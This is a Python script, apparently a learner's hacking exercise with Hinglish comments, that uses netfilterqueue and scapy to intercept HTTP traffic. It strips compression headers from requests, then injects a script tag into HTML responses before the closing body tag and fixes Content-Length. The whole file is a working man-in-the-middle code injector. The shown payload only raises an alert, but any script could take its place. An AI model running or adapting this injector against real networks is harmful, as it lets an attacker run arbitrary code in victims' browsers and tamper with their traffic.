import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = scapy_packet[scapy.Raw].load.decode(errors="ignore")
        
        # Request pakdi?
        if scapy_packet[scapy.TCP].dport == 80:
            print("[-->] HTTP Request Pakdi!")
            load = re.sub(r"Accept-Encoding:.*?\r\n", "", load, flags=re.IGNORECASE)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
            
        # Response pakda?
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[<--] HTTP Response Pakda!")
            injection_code = "<script>alert('Saurabh Has Hacked This Page!');</script>"
            
            # Agar </body> mil gaya, toh usko replace karo
            if "</body>" in load:
                load = load.replace("</body>", injection_code + "</body>")
                print("[***] Injection Successful in Body!")
            
            content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                old_header = content_length_search.group(0)
                new_header = "Content-Length: " + str(new_content_length)
                load = load.replace(old_header, new_header)
                print("[*] Length Modified!")
        
        if load != scapy_packet[scapy.Raw].load.decode(errors="ignore"):
            new_packet = set_load(scapy_packet, load.encode())
            packet.set_payload(bytes(new_packet))

    packet.accept()

print("[*] Detective Injector Running... Traffic ka wait kar raha hoon.")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
